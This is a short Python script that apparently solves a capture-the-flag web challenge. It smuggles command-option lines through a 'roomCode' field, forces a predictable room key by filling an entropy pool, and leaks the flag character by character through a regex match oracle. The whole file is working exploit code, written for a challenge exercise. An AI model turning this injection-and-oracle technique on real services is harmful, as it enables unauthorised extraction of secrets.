import requests
import string
import sys

FLAG_ALPHABET = string.hexdigits
ENTROPY_POOL_SIZE = 256

if len(sys.argv) != 2:
    exit(f'{sys.argv[0]} <host>')
host = sys.argv[1]

def check_match(needle):
    payload = f'CBG:\n-qe{needle}\n-ttxt\n/'

    # reset room key, fill entropy pool to fix the key
    requests.post(host + '/api/reset?' + 'a' * ENTROPY_POOL_SIZE, json={
        'roomCode': payload
    })

    roomKey = b'aaaaaaaa'.hex()

    # search until regex finds no matches and validation passes
    status = 400
    while status == 400:
        resp = requests.post(host + '/api/check', json={
            'roomCode': payload,
            'roomKey': roomKey
        })
        status = resp.status_code

    return status == 200

acc = 'flag-'

print(acc, end='')
sys.stdout.flush()

while True:
    for c in FLAG_ALPHABET:
        if check_match('.*' + acc[-3:] + c + '.*'):
            acc += c
            print(c, end='')
            sys.stdout.flush()
            break
    else:
        break

print()